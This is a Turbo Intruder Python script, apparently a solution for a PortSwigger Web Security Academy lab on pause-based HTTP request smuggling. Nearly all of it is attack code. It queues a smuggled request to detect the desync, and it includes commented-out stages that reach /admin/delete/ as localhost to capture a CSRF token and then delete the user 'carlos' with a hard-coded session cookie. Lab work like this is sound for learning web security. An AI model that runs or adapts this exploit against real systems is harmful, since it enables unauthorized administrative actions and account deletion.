def queueRequests(target, _):
    engine = RequestEngine(endpoint="https://0a6100130435171a83326e6e00af0010.web-security-academy.net:443",
                        concurrentConnections=1,
                        requestsPerConnection=100,
                        pipeline=False
                        )
   
    attack_request = """POST /resources HTTP/1.1
Host: 0a57003803fd1718802b2b6800b8000a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: %s

%s"""

    normal_request = """GET / HTTP/1.1
Host: 0a57003803fd1718802b2b6800b8000a.web-security-academy.net

"""

    # detect
    smuggled_request_detect = """GET /hopefully404/ HTTP/1.1
Host: 0a57003803fd1718802b2b6800b8000a.web-security-academy.net

"""

    # exploit
    smuggled_request_exploit1 = """GET /admin/delete/ HTTP/1.1
Host: localhost

"""

    smuggled_request_exploit2 = """POST /admin/delete/ HTTP/1.1
Host: localhost
Cookie: session=2yndNZDTxj0OeuwK4P0sdzzAKSKjf9M4
Content-Length: 53

csrf=LCGFIWA7RNeRDqzs2WeUWbd9ODAcvwob&username=carlos

"""

    # Uncomment 1 of the following lines to detect the attack or exploit it
    engine.queue(attack_request, [len(smuggled_request_detect), smuggled_request_detect], pauseMarker=['\r\n\r\nGET'], pauseTime=61000) # detect
    # engine.queue(attack_request, [len(smuggled_request_exploit1), smuggled_request_exploit1], pauseMarker=['\r\n\r\nPOST'], pauseTime=61000) # exploit to get the CSRF token
    # engine.queue(attack_request, [len(smuggled_request_exploit2), smuggled_request_exploit2], pauseMarker=['\r\n\r\nPOST'], pauseTime=61000) # exploit to delete the user
    engine.queue(normal_request)
    
    
def handleResponse(req, _):
    table.add(req)